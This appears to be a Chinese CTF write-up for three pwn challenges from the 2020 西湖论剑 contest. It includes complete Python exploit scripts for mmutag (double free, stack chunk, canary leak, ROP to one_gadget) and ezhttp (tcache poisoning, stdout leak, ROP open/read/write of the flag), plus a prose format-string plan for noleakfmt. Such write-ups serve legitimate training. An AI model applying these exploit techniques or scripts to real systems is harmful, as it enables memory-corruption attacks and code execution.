
# 2020西湖论剑题目 write up

## mmutag

`Double free` 分配 `chunk` 到 `stack` 中，然后改写 `ret` 地址，得到 `libc` 地址，进而覆盖 `ret` 地址为 `one_gadget`

```python
#https://github.com/matrix1001/welpwn
from PwnContext import *
try:
    from IPython import embed as ipy
except ImportError:
    print ('IPython not installed.')
if __name__ == '__main__':
    context.terminal = ['tmux', 'splitw', '-h']
    context.log_level = 'debug'
    # functions for quick script
    s = lambda data :ctx.send(str(data)) #in case that data is an int
    sa = lambda delim,data :ctx.sendafter(str(delim), str(data))
    sl = lambda data :ctx.sendline(str(data))
    sla = lambda delim,data :ctx.sendlineafter(str(delim), str(data))
    r = lambda numb=4096 :ctx.recv(numb)
    ru = lambda delims, drop=True :ctx.recvuntil(delims, drop)
    irt = lambda :ctx.interactive()
    rs = lambda *args, **kwargs :ctx.start(*args, **kwargs)
    dbg = lambda gs='', **kwargs :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32 = lambda data :u32(data.ljust(4, '\0'))
    uu64 = lambda data :u64(data.ljust(8, '\0'))
    ctx.binary = './pwn'
    #ctx.custom_lib_dir = '/home/iddm/glibc-all-in-one/libs/2.27-3ubuntu1_amd64'
    ctx.remote = ('183.129.189.62', 60804)
    #ctx.remote_libc = './libc.so'
    #ctx.debug_remote_libc = True
    ctx.symbols = {
    'node':0x6020C0,
    }
    ctx.breakpoints = [0x400AB5]#menu
    def lg(s,addr):
        print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    def add(idx,content='\n'):
        sla('ise',1)
        sla('id',idx)
        sa('content',content)
    def delete(idx):
        sla('ise',2)
        sla('id',idx)
    def read_some(content):
        sla('ise',3)
        s(content)
    rs('remote')
    #dbg()
    name = '123'
    sla('name',name)
    ru('tag: ')
    stack = int(ru(':',drop=True),16)
    aim = stack-0x40
    lg('stack',stack)
    #rs('remote')
    sla('ice',2)
    add(1)
    add(2)
    add(3)
    delete(1)
    delete(2)
    delete(1)
    read_some('a'*0x19)
    ru('a'*0x19)
    canary = uu64('\0' + r(7))
    lg('canary',canary)
    read_some(p64(0x7f)*2+p64(stack-0x23)+'\0')
    dbg()
    add(4,p64(aim))
    add(5)
    pop_rdi = 0x0000000000400d23
    puts_plt = 0x4006B0
    puts_got = 0x602020
    #payload = '\0'*3 + p64(stack-0x20) + p64(0x0000000000400750) + p64(0x0000000000400b01)
    payload = 'a'*0x8 + p64(canary)
    payload += p64(stack+0x10) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x400A99)
    add(6)
    add(7,payload)
    sla('ise',4)
    ru('\n')
    libc_base = uu64(ru('\n',drop=True))-0x6f6a0#-ctx.libc.sym['puts']
    lg('libc_base',libc_base)
    one = libc_base+ 0x45226
    payload = '\0'*3 + p64(0)*1+p64(canary)+p64(0) + p64(one)
    add(8,payload)
    irt()
```

## ezhttp

2.27 先用 `tache atk` 改写控制结构，使得 `tcache` bin 数目超过 7，然后利用 `unsortbin` 中残留的信息，爆破 `stdout`，进而泄露 `libc`/`stack`/`prog` 地址，然后控制 `global_node` 结构，改写 `stack`，最终进行 `rop`，`orw` 读取 flag。

```python
#https://github.com/matrix1001/welpwn
from PwnContext import *
try:
    from IPython import embed as ipy
except ImportError:
    print ('IPython not installed.')
if __name__ == '__main__':
    context.terminal = ['tmux', 'splitw', '-h']
    context.log_level = 'debug'
    # functions for quick script
    s = lambda data :ctx.send(str(data)) #in case that data is an int
    sa = lambda delim,data :ctx.sendafter(str(delim), str(data))
    sl = lambda data :ctx.sendline(str(data))
    sla = lambda delim,data :ctx.sendlineafter(str(delim), str(data))
    r = lambda numb=4096 :ctx.recv(numb)
    ru = lambda delims, drop=True :ctx.recvuntil(delims, drop)
    irt = lambda :ctx.interactive()
    rs = lambda *args, **kwargs :ctx.start(*args, **kwargs)
    dbg = lambda gs='', **kwargs :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32 = lambda data :u32(data.ljust(4, '\0'))
    uu64 = lambda data :u64(data.ljust(8, '\0'))
    ctx.binary = './ezhttp.bak'
    #ctx.custom_lib_dir = '/home/rhl/Desktop/CTF/glibc-all-in-one/libs/2.23-0ubuntu10_amd64' #change the libs
    ctx.remote_libc = './libc-2.27.so' #only change the libc.so
    ctx.remote = ('183.129.189.61',56002)
    ctx.debug_remote_libc = True
    ctx.symbols = {
    'node':0x203120
    }
    ctx.breakpoints = [0x18CD,0x1753]#menu:0x18CD ,0x1A78,0x12CC
    ctx.debug()
    def lg(s,addr):
        print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    def add(idx, content):
        payload = 'POST /create '
        payload += 'Cookie: user=admin '
        payload += 'token: '+'\x01\x0d'
        payload += '\r\n\r\n'
        payload += 'content=' + content
        sa('me',payload)
    def delete(idx):
        payload = 'POST /del '
        payload += 'Cookie: user=admin '
        payload += 'token: '+'\x01\x0d'
        payload += '\r\n\r\n'
        payload += 'index=' + str(idx)
        sa('me',payload)
    def edit(idx,content):
        payload = 'POST /edit '
        payload += 'Cookie: user=admin '
        payload += 'token: '+'1\r'
        payload += '\r\n\r\n'
        payload += 'index=' + str(idx) + "&" + 'content=' + content
        sa('me',payload)
    while True:
        try:
            rs()
            context.log_level = 'info'
            #rs('remote')
            #rs()
            add(0,'a'*0x10)
            ru('Your gift: ')
            heap_base = int(ru('"',drop=True),16)-0x260
            lg('heap_base',heap_base)
            delete(0)
            delete(0)
            payload = '\x05'*0x8+'\xff'*6+'\x05'*2
            add(1,p64(heap_base+0x10))
            add(2,'a'*0x8)
            add(3,payload)
            #dbg()
            add(4,'a'*0xa0)
            add(5,'a'*0xf0)
            delete(4)
            add(6,'\x60\xb7')
            #dbg()
            delete(1)
            edit(2,p64(heap_base+0x280)[:6]+'\n')
            #dbg()
            add(7,'a'*0x6)
            add(8,'\x80\xb7')
            add(9,p64(0xfbad3887))
            #edit(6,'\x80\n')
            delete(7)
            edit(2,p64(heap_base+0x280)[:6]+'\n')
            #dbg()
            add(10,'a'*6)
            add(11,'\x80\xb7')
            #dbg()
            #add(11,'./flag')
            #add(12,'\x80')
            add(12,'a'*0x10)
            edit(12,'\x80\n')
            #'''
            ru('========\n')
            libc_base = uu64(r(8)) - 0x3ec780
            lg('libc',libc_base)
            aim = libc_base+0x619f60
            environ = libc_base+0x3ee098
            lg('environ',environ)
            payload = p64(environ) + p64(environ+8)[:6] + '\n'
            edit(12,payload)
            ru('========\n')
            stack = uu64(r(8))
            aim = stack-0x1940
            lg('stack',stack)
            payload = p64(aim) + p64(aim+8)[:6] + '\n'
            edit(12,payload)
            ru('========\n')
            prog = uu64(r(8))-0x1afc
            lg('prog',prog)
            #dbg()
            node = prog+0x203120
            #edit(12)
            delete(5)
            delete(5)
            add(13,'a'*0xf0)
            edit(13,p64(node)+p64(0)+'\n')
            add(14,'a'*0xf0)
            edit(2,'./flag\0\n')
            #dbg()
            payload = p64(aim) + p64(0xf0)+p64(heap_base+0x260)+p64(0x10)+'\n'
            add(15,'a'*0xf0)
            edit(15,payload)
            pop_rdi = libc_base + 0x000000000002155f
            pop_rsi = libc_base + 0x0000000000023e8a
            pop_rdx = libc_base + 0x0000000000001b96
            open1 = libc_base+0x10fd50
            read = libc_base+0x110180
            write = libc_base + 0x110250
            flag_addr = heap_base +0x260
            heap_addr = heap_base + 0x1000
            payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open1)
            payload += p64(pop_rdi) + p64(4 ) + p64(pop_rsi) + p64(heap_addr) + p64(pop_rdx) + p64(0x30) + p64(read)
            payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap_addr) + p64(pop_rdx) + p64(0x30) + p64(write)
            payload += p64(0)+'\n'
            #dbg()
            edit(0,payload)
            irt()
        except KeyboardInterrupt:
            break
        except EOFError:
            continue
```

## noleakfmt

提供了 `stack` 地址，但是关闭了 `stdout` 输出，这种情况下利用 `fmt` 漏洞最多写 `0x2000` 字节左右。

起初打算利用 `stack` 区域中原有的跳板来做，如下图所示，但是经过测试得到跳板的栈区偏移是非固定的，所以跳板的偏移也不能确定，当时没有注意到跳板偏移不固定，时间也不够了就没有把这题做出来。

所以需要人为构造跳板，由于关闭了标准输出以后 `fmt` 只能写 `0x2000` 左右大小，当 `rsp` 后两字节小于 `0x1ff8` 的时候，可以将跳板的末尾两字节覆盖为 `rsp+8`，解决了跳板的问题。

后面的思路就是利用 `stack` 区域中残留的 `libc` 信息，修改 `_IO_2_1_stdout_->fileno` 为二，然后修改 `malloc_hook` 为 `one_gadget`，最终 `printf` 输出长字符串调用 `malloc` 进行 get shell。

最终是需要爆破两个地方，概率大概是 `1/256`

![](upload/attach/202010/822769_DQD2KBE59H7948X.png)
